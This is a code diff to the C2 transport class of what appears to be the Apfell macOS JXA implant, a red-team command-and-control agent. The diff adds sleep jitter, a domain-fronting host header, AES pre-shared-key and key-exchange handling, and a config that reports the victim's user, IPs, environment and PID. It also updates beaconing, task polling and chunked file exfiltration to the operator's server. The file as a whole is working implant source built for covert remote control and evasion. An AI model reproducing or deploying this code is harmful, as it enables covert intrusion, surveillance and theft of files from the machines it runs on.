@@ -3,21 +3,27 @@ class customC2 extends baseC2{
 	constructor(interval, baseurl){
 		super(interval, baseurl);
 		this.commands = [];
+		this.api_version = "1.3";
+		this.jitter = callback_jitter;
 		this.host_header = "domain_front";
 		this.aes_psk = "AESPSK"; // base64 encoded key
-		if(this.aes_psk != ""){
+		if(this.aes_psk !== ""){
 		    this.parameters = $({"type": $.kSecAttrKeyTypeAES});
             this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
             this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
 		}
-        this.using_key_exchange = "encrypted_exchange_check" == "T";
-        if(this.using_key_exchange){
-            //lets us know if we can decrypt right away or not
-            this.exchanging_keys = true;
-        }else{
-            this.exchanging_keys = false;
-        }
+        this.using_key_exchange = "encrypted_exchange_check" === "T";
+		this.exchanging_keys = this.using_key_exchange;
 	}
+	gen_sleep_time(){
+      //generate a time that's this.interval += (this.interval * 1/this.jitter)
+      let plus_min = Math.round(Math.random());
+      if(plus_min === 1){
+          return this.interval + (this.interval * (Math.round(Math.random()*this.jitter)/100));
+      }else{
+          return this.interval - (this.interval * (Math.round(Math.random()*this.jitter)/100));
+      }
+    }
 	encrypt_message(data){
 	    // takes in the string we're about to send, encrypts it, and returns a new string
 	    //create the encrypt transform variable
@@ -77,7 +83,7 @@ class customC2 extends baseC2{
 	    // Encrypt our initial message with sessionID and Public key with the initial AES key
 	    while(true){
 	        try{
-                var base64_pub_encrypted = this.htmlPostData("api/v1.3/crypto/EKE/" + apfell.uuid, initial_message);
+                var base64_pub_encrypted = this.htmlPostData("api/v" + this.api_version + "/crypto/EKE/" + apfell.uuid, initial_message);
                 var pub_encrypted = $.NSData.alloc.initWithBase64Encoding(base64_pub_encrypted);
                 // Decrypt the response with our private key
                 var decrypted_message = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, pub_encrypted, Ref());
@@ -93,61 +99,76 @@ class customC2 extends baseC2{
                 return session_key;
 
             }catch(error){
-                $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
+                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
             }
         }
 	}
 	getConfig(){
 		//A RESTful base config consists of the following:
 		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
-		return JSON.stringify({'baseurl': this.baseurl, 'interval': this.interval, 'killdate': '', 'commands': this.commands.join(",")}, null, 2);
+        let config = {
+            "C2": {
+                "baseurl": this.baseurl,
+                "interval": this.interval,
+                "jitter": this.jitter,
+                "commands": this.commands.join(","),
+                "api_version": this.api_version,
+                "host_header": this.host_header,
+                "aes_psk": this.aes_psk
+            },
+            "Host": {
+                "user": apfell.user,
+                "fullName": apfell.fullName,
+                "ips": apfell.ip,
+                "hosts": apfell.host,
+                "environment": apfell.environment,
+                "uptime": apfell.uptime,
+                "args": apfell.args,
+                "pid": apfell.pid,
+                "apfell_id": apfell.id,
+                "payload_id": apfell.uuid
+            }};
+		return JSON.stringify(config, null, 2);
 	}
-	setConfig(params){
-		//A RESTful base config has 3 updatable components
-		//  BaseURL (includes Port), CallbackInterval, and KillDate (not implemented yet)
-		if(params['commands'] != undefined){
-		    this.commands = params['commands'];
-		}
-	}
-	checkin(ip, pid, user, host){
+	checkin(ip, pid, user, host, os, arch){
 		//get info about system to check in initially
 		//needs IP, PID, user, host, payload_type
-		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
-		if(user == "root"){
+		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os":os, "architecture": arch};
+		if(user === "root"){
 		    info['integrity_level'] = 3;
 		}
 		//calls htmlPostData(url,data) to actually checkin
 		//Encrypt our data
 		//gets back a unique ID
-        if(this.exchanging_keys){
+        if(this.using_key_exchange){
             var sessionID = this.negotiate_key();
-            var jsondata = this.htmlPostData("api/v1.3/crypto/EKE/" + sessionID, JSON.stringify(info));
-        }else if(this.aes_psk != ""){
-            var jsondata = this.htmlPostData("api/v1.3/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
+            var jsondata = this.htmlPostData("api/v" + this.api_version + "/crypto/EKE/" + sessionID, JSON.stringify(info));
+        }else if(this.aes_psk !== ""){
+            var jsondata = this.htmlPostData("api/v" + this.api_version + "/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
         }else{
-            var jsondata = this.htmlPostData("api/v1.3/callbacks/", JSON.stringify(info));
+            var jsondata = this.htmlPostData("api/v" + this.api_version + "/callbacks/", JSON.stringify(info));
         }
 		apfell.id = jsondata.id;
 		// if we fail to get a new ID number, then exit the application
-		if(apfell.id == undefined){ $.NSApplication.sharedApplication.terminate(this); }
+		if(apfell.id === undefined){ $.NSApplication.sharedApplication.terminate(this); }
 		return jsondata;
 	}
 	getTasking(){
 		while(true){
 		    try{
-		        var url = this.baseurl + "api/v1.3/tasks/callback/" + apfell.id + "/nextTask";
+		        var url = this.baseurl + "api/v" + this.api_version + "/tasks/callback/" + apfell.id + "/nextTask";
 		        var task = this.htmlGetData(url);
 		        return JSON.parse(task);
 		    }
 		    catch(error){
-		        $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
+		        $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
 		    }
 		}
 
 	}
 	postResponse(task, output){
 	    // this will get the task object and the response output
-	    return this.postRESTResponse("api/v1.3/responses/" + task.id, output);
+	    return this.postRESTResponse("api/v" + this.api_version + "/responses/" + task.id, output);
 	}
 	postRESTResponse(urlEnding, data){
 		//depending on the amount of data we're sending, we might need to chunk it
@@ -165,11 +186,11 @@ class customC2 extends baseC2{
 
 		return jsondata;
 	}
-	htmlPostData(urlEnding, sendData){
+	htmlPostData(urlEnding, sendData, json=true){
 	    var url = this.baseurl + urlEnding;
         //console.log(url);
         //encrypt our information before sending it
-        if(this.aes_psk != ""){
+        if(this.aes_psk !== ""){
             var data = this.encrypt_message(sendData);
         }else{
             var data = $.NSString.alloc.initWithUTF8String(sendData);
@@ -191,7 +212,7 @@ class customC2 extends baseC2{
 				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
 				var resp = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
 				var deepresp = ObjC.deepUnwrap(resp);
-				if(deepresp[0] == "<"|| deepresp.length == 0 || deepresp.includes("ERROR: Requested URL")){
+				if(deepresp[0] === "<"|| deepresp.length === 0 || deepresp.includes("ERROR: Requested URL")){
                     //this means we likely got back some form of error or redirect message, not our actual data
                     //console.log(deepresp);
                     continue;
@@ -200,14 +221,23 @@ class customC2 extends baseC2{
 				//console.log("response: " + resp.js);
 				if(!this.exchanging_keys){
 				    //we're not doing the initial key exchange
-				    if(this.aes_psk != ""){
+				    if(this.aes_psk !== ""){
 				        //if we do need to decrypt the response though, do that
-				        resp = ObjC.unwrap(this.decrypt_message(resp));
-                        var jsondata = JSON.parse(resp);
-                        return jsondata;
+                        if(json){
+                            resp = ObjC.unwrap(this.decrypt_message(resp));
+                            return JSON.parse(resp);
+                        }else{
+                            return this.decrypt_message(resp);
+                        }
+
 				    }else{
                         //we don't need to decrypt it, so we can just parse and return it
-                        return JSON.parse(resp.js);
+                        if(json){
+                            return JSON.parse(resp.js);
+                        }else{
+                            return resp.js;
+                        }
+
 				    }
 				}
 				else{
@@ -217,7 +247,7 @@ class customC2 extends baseC2{
 
 			}
 			catch(error){
-			    $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
+			    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
 			}
 		}
 	}
@@ -234,13 +264,13 @@ class customC2 extends baseC2{
                 var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
                 var data = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
                 var deepresp = ObjC.deepUnwrap(data);
-				if(deepresp[0] == "<"|| deepresp.length == 0 || deepresp.includes("ERROR: Requested URL")){
+				if(deepresp[0] === "<"|| deepresp.length === 0 || deepresp.includes("ERROR: Requested URL")){
                     //this means we likely got back some form of error or redirect message, not our actual data
                     //console.log(deepresp);
                     continue;
                 }
 
-                if(this.aes_psk != ""){
+                if(this.aes_psk !== ""){
                     var decrypted_message = this.decrypt_message(data);
                 }else{
                     var decrypted_message = data;
@@ -250,7 +280,7 @@ class customC2 extends baseC2{
 	        }
 	        catch(error){
 	            //console.log("error in htmlGetData: " + error.toString());
-	            $.NSThread.sleepForTimeInterval(this.interval); //wait timeout seconds and try again
+	            $.NSThread.sleepForTimeInterval(this.gen_sleep_time()); //wait timeout seconds and try again
 	        }
 	    }
 	}
@@ -258,11 +288,11 @@ class customC2 extends baseC2{
         // download just has one parameter of the path of the file to download
         if( does_file_exist(params) ){
             var offset = 0;
-            var url = "api/v1.3/responses/" + task.id;
+            var url = "api/v" + this.api_version + "/responses/" + task.id;
             var chunkSize = 512000; //3500;
             // get the full real path to the file
             try{
-                if(params[0] != "/"){
+                if(params[0] !== "/"){
                     var fileManager = $.NSFileManager.defaultManager;
                     var cwd = fileManager.currentDirectoryPath.js;
                     params = cwd + "/" + params;
@@ -276,21 +306,21 @@ class customC2 extends baseC2{
 
             // always round up to account for chunks that are < chunksize;
             var numOfChunks = Math.ceil(fileSize / chunkSize);
-            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id, 'full_path': params});
+            var registerData = JSON.stringify({'total_chunks': numOfChunks, 'full_path': params});
             var registerData = convert_to_nsdata(registerData);
             var registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
             //var registerFile = this.postResponse(task, registerData);
-            if (registerFile['status'] == "success"){
+            if (registerFile['status'] === "success"){
                 handle.seekToFileOffset(0);
                 var currentChunk = 1;
                 var data = handle.readDataOfLength(chunkSize);
                 while(parseInt(data.length) > 0 && offset < fileSize){
                     // send a chunk
-                    var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['file_id']});
+                    var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js,'file_id': registerFile['file_id']});
                     fileData = convert_to_nsdata(fileData);
                     this.htmlPostData(url, JSON.stringify({"response": fileData.base64EncodedStringWithOptions(0).js}))
                     //this.postResponse(task, fileData);
-                    $.NSThread.sleepForTimeInterval(this.interval);
+                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
 
                     // increment the offset and seek to the amount of data read from the file
                     offset += parseInt(data.length);
@@ -311,16 +341,14 @@ class customC2 extends baseC2{
 	}
 	upload(task, params){
 	    try{
-	        var url = "api/v1.3/files/" + params + "/callbacks/" + apfell.id;
-            var file_data = this.htmlGetData(this.baseurl + url);
+            let url = "api/v" + this.api_version + "/files/callback/" + apfell.id;
+            let data = JSON.stringify({"file_id": params});
+            let file_data = this.htmlPostData(url, data, false);
+            //var file_data = this.htmlGetData(this.baseurl + url);
             if(file_data === undefined){
                 throw "Got nothing from the Apfell server";
             }
-            var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
-            //var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
-            return decoded_data;
-            //var output = write_data_to_file(decoded_data, file_path);
-            //return output;
+            return $.NSData.alloc.initWithBase64Encoding($(file_data));
 	    }catch(error){
 	        return error.toString();
 	    }
